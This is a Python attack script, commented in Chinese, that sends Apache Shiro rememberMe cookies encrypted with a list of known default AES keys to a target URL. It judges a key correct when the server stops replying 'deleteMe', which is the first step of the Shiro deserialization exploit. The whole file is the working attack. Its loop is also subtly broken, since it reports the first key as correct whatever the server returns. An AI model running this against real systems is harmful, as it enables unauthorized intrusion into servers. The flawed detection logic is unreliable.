import base64
import uuid
import requests
from Crypto.Cipher import AES

def encrypt_AES_GCM(msg, secretKey):
    aesCipher = AES.new(secretKey, AES.MODE_GCM)
    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)
    return (ciphertext, aesCipher.nonce, authTag)

def encode_rememberme(target):
    keys = ['kPH+bIxk5D2deZiIxcaaaA==', '4AvVhmFLUs0KTA3Kprsdag==','66v1O8keKNV3TTcGPK1wzg==', 'SDKOLKn2J1j/2BHjeZwAoQ==']     # 此处简单列举几个密钥
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes

    file_body = base64.b64decode('rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==')
    for key in keys:
        try:
            # CBC加密
            encryptor = AES.new(base64.b64decode(key), mode, iv)
            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))
            res = requests.get(target, cookies={'rememberMe': base64_ciphertext.decode()},timeout=3,verify=False, allow_redirects=False)
            if res.headers.get("Set-Cookie") == None:
                print("正确KEY ：" + key)
                return key
            else:
                if 'rememberMe=deleteMe;' not in res.headers.get("Set-Cookie"):
                    print("正确key:" + key)
                    return key
            # GCM加密
            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))
            base64_ciphertext = base64.b64encode(encryptedMsg[1] + encryptedMsg[0] + encryptedMsg[2])
            res = requests.get(target, cookies={'rememberMe': base64_ciphertext.decode()}, timeout=3, verify=False, allow_redirects=False)

            if res.headers.get("Set-Cookie") == None:
                print("正确KEY:" + key)
                return key
            else:
                if 'rememberMe=deleteMe;' not in res.headers.get("Set-Cookie"):
                    print("正确key:" + key)
                    return key
            print("正确key:" + key)
            return key
        except Exception as e:
            print(e)